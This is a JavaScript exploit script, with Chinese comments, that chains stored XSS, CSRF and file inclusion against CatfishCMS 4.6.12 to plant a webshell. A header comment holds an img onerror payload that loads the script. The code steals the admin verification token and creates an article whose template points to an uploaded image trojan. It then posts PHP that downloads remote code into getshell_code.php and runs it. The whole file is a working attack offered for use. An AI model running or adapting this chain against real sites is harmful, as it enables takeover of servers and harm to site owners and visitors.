/*  
    需要插入的xss代码
    <img src="#" alt="xss_csrf_getshll" onerror="var url = 'http://127.0.0.1/cms/CatfishCMS-4.6.12/xss-js/CatfishCMS-4.6.12-xss.js';xss_js = '<scr'+'ipt src='+url+'><\/sc'+'ript>';$('body').append(xss_js);">
*/ 

//不用动的
var articles = 'index.php/admin/Index/articles.html';//用来获取 verification 绕过检测
var newpage = 'index.php/admin/Index/newpage.html';//生成文章地址
var allpage = 'index.php/admin/Index/allpage.html';//获取文章链接

//需要改的
var url = 'http://127.0.0.1';//你要日的站的域名
var directory = '/cms/CatfishCMS-4.6.12/'; //日的站的额外目录一般为空即可(站点设置二级目录时，此目录要填写)
var img_trojan_url = '../../../'+'data/uploads/20171201/2c8b7c7f1d49faeb5321ce0c9b1962af.jpg';//图片马的地址 修改 + 号后面的即可
var getshell_code = 'http://127.0.0.1/cms/CatfishCMS-4.6.12/xss-js/getshell_code.txt';//恶意代码远程包含的地址

$('body').append('<div id="csrf_verification" style="display:none;"></div>');
$('body').append('<div id="csrf_allpage" style="display:none;"></div>');

$.ajax({
    url: url+directory+articles,
    dataType: "json",
    success: function(verification_content){
        $('#csrf_verification').append(verification_content);
        var verification = $('#verification').html();//用来绕过验证的
        // alert(verification);

        //csrf生成文章,引起文件包含漏洞
        $.ajax({
            type: "POST",
            url: url+directory+newpage,
            data: {
                'biaoti':'xss_csrf_getshll',
                'template':img_trojan_url,
                'verification':verification,
                'fabushijian':'2017-12-05 11:56:48'
            },
            success: function(){
                //csrf获取shell链接
                $.ajax({
                    type: "POST",
                    url: url+directory+allpage,
                    success: function(allpage_content){
                        $('#csrf_allpage').append(allpage_content);
                        var shell_id = $('#csrf_allpage .table-responsive .table-bordered tbody tr td .gouxuan').eq(0).val();
                        var shell_url = $('#csrf_allpage .table-responsive .table-bordered tbody tr td a').eq(0).attr('href');

                        var shell_content = '';
                            shell_content+= "$myfile = fopen('getshell_code.php', 'w');";
                            shell_content+= '$txt = '+'file_get_contents("'+getshell_code+'");';
                            shell_content+= 'fwrite($myfile, $txt);';
                            console.log(shell_content);
                        
                        //执行shell 生成马子
                        $.ajax({
                            type: "POST",
                            url: url+shell_url,
                            dataType: "json",
                            data: {'ddd':shell_content},
                            success: function(data){
                                $.ajax({
                                    type: "GET",
                                    url: url+directory+'getshell_code.php',
                                    dataType: "json", 
                                    // data: {'zzz':1}
                                });
                            },
                            error: function(){
                                $.ajax({
                                    type: "GET",
                                    url: url+directory+'getshell_code.php',
                                    dataType: "json", 
                                    // data: {'zzz':1}
                                });
                            }   
                        });

                    } 
                });

            } 
        });

    }
});